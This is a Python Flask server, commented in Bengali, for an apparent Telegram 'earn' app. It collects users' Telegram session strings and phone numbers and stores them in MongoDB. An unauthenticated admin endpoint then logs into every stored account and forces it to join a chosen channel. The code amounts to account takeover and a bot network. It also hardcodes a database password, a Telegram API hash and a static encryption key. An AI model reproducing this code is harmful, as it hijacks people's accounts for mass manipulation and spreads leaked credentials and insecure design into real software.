import os
import base64
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
CORS(app)

# --- কনফিগারেশন ---
API_ID = 36466824      
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
# Northflank বা Render এর জন্য os.environ রাখা হয়েছে, না থাকলে সরাসরি লিঙ্কটি কাজ করবে
MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0")
SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' 

# ডাটাবেস কানেকশন
try:
    client_db = MongoClient(MONGO_URI)
    db = client_db['AAF_TeleEarn']
    users_col = db['users']
    sessions_col = db['sessions']
    print("✅ Server connected to MongoDB!")
except Exception as e:
    print(f"❌ MongoDB Error: {e}")

# --- এনক্রিপশন লজিক (আগের মতোই রাখা হয়েছে) ---
def encrypt_session(session_str):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

def decrypt_session(encrypted_str):
    iv_b64, ct_b64 = encrypted_str.split(':')
    iv = base64.b64decode(iv_b64)
    ct = base64.b64decode(ct_b64)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')

# --- ১. সেশন সেভ করা (Account Tracking সহ) ---
@app.route('/api/add_account', methods=['POST'])
def add_account():
    data = request.json
    uid = data.get('telegram_id')
    raw_session = data.get('session_string') 
    phone = data.get('phone')

    if not raw_session or not uid:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

    encrypted = encrypt_session(raw_session)
    
    sessions_col.update_one(
        {"phone": phone},
        {"$set": {"telegram_id": int(uid), "session": encrypted, "status": "Active"}},
        upsert=True
    )
    # আপনার আগের সেই 'added_accounts' বৃদ্ধি করার লজিক
    users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"added_accounts": 1}})
    
    return jsonify({"status": "success", "message": "Account linked to server!"})

# --- ২. অ্যাডমিন কন্ট্রোল (Force Join লজিক যা Northflank এ এরর দেবে না) ---
async def perform_join(channel_to_join):
    all_sessions = sessions_col.find({"status": "Active"})
    count = 0
    for sess in all_sessions:
        try:
            string_session = decrypt_session(sess['session'])
            async with TelegramClient(StringSession(string_session), API_ID, API_HASH) as client:
                await client(functions.channels.JoinChannelRequest(channel=channel_to_join))
                count += 1
        except Exception as e:
            print(f"Error: {e}")
    return count

@app.route('/api/admin/force_join', methods=['POST'])
def force_join_trigger():
    data = request.json
    channel_to_join = data.get('channel', '@aaf_tele_earn') 
    
    # Flask এর ভেতর Async চালানোর জন্য নতুন লুপ
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    count = loop.run_until_complete(perform_join(channel_to_join))
    
    return jsonify({"status": "success", "joined_accounts": count})

# --- ৩. ইউজার লগইন এবং ডাটা আপডেট ---
@app.route('/api/user_data_login', methods=['POST'])
def user_login():
    data = request.json
    uid = data.get('telegram_id')
    name = data.get('name')
    
    users_col.update_one(
        {"telegram_id": int(uid)},
        {"$set": {"name": name, "status": "Active"}},
        upsert=True
    )
    return jsonify({"status": "success", "message": "Account linked to server!"})

# --- ৪. ড্যাশবোর্ড ডাটা (টাস্ক চার্ট এবং ব্যালেন্স সহ পূর্ণাঙ্গ লজিক) ---
@app.route('/api/user_data/<telegram_id>', methods=['GET'])
def get_user_data(telegram_id):
    try:
        user = users_col.find_one({"telegram_id": int(telegram_id)})
        if user:
            # আপনার সেই আগের টাস্ক লিস্ট
            task_list = [
                {"id": 1, "task_name": "Daily Login", "reward": 0.5, "status": "Done"},
                {"id": 2, "task_name": "Telegram Join", "reward": 1.0, "status": "Pending"},
                {"id": 3, "task_name": "Watch Ad", "reward": 0.2, "status": "Open"}
            ]
            
            return jsonify({
                "status": "success",
                "name": user.get("name", "User"),
                "main_balance": user.get("main_balance", 0.0),
                "task_balance": user.get("task_balance", 0.0),
                "trade_balance": user.get("trade_balance", 0.0),
                "acc_balance": user.get("acc_balance", 0.0),
                "acc_status": user.get("status", "Inactive"),
                "added_accounts": user.get("added_accounts", 0),
                "tasks": task_list
            })
    except Exception as e:
        print(f"❌ API Error: {e}")
        
    return jsonify({"status": "error", "message": "User not found"}), 404

if __name__ == "__main__":
    # Northflank বা Render এ পোর্ট অটোমেটিক সেট করার জন্য
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
